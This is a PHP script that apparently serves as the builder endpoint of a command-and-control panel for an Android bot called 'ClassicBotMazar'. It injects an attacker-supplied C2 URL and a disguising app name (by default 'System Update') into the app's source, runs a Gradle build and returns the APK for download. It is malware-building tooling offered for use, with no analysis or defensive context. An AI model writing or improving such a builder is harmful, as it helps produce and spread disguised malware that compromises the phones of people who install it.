<?php
header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['success' => false, 'message' => 'Method not allowed']);
    exit;
}

$input = json_decode(file_get_contents('php://input'), true);
$apkName = $input['apkName'] ?? 'ClassicBotMazar';
$appLabel = $input['appLabel'] ?? 'System Update';
$c2Url = $input['c2Url'] ?? '';

if (empty($c2Url)) {
    echo json_encode(['success' => false, 'message' => 'C2 URL is required']);
    exit;
}

// Update Constants.kt with the new C2 URL
$constantsPath = __DIR__ . '/../../../app/src/main/java/org/reddeaddeath/classicbotmazar/Constants.kt';
if (file_exists($constantsPath)) {
    $content = file_get_contents($constantsPath);
    $content = preg_replace('/val urlConnection = ".*"/', 'val urlConnection = "' . $c2Url . '"', $content);
    file_put_contents($constantsPath, $content);
}

// Update strings.xml with the new app label
$stringsPath = __DIR__ . '/../../../app/src/main/res/values/strings.xml';
if (file_exists($stringsPath)) {
    $content = file_get_contents($stringsPath);
    $content = preg_replace('/<string name="app_name">.*<\/string>/', '<string name="app_name">' . $appLabel . '</string>', $content);
    file_put_contents($stringsPath, $content);
}

// Run Gradle build
$output = [];
$returnVar = 0;
// We use ./gradlew assembleDebug to build the APK
exec('cd ../../../ && ./gradlew assembleDebug 2>&1', $output, $returnVar);

if ($returnVar === 0) {
    $apkPath = 'app/build/outputs/apk/debug/app-debug.apk';
    $newApkPath = 'c2/panel/' . $apkName . '.apk';
    
    if (file_exists(__DIR__ . '/../../../' . $apkPath)) {
        copy(__DIR__ . '/../../../' . $apkPath, __DIR__ . '/../' . $apkName . '.apk');
        echo json_encode([
            'success' => true, 
            'message' => 'Build successful', 
            'downloadUrl' => $apkName . '.apk',
            'log' => implode("\n", $output)
        ]);
    } else {
        echo json_encode(['success' => false, 'message' => 'APK file not found after build', 'log' => implode("\n", $output)]);
    }
} else {
    echo json_encode(['success' => false, 'message' => 'Build failed', 'log' => implode("\n", $output)]);
}
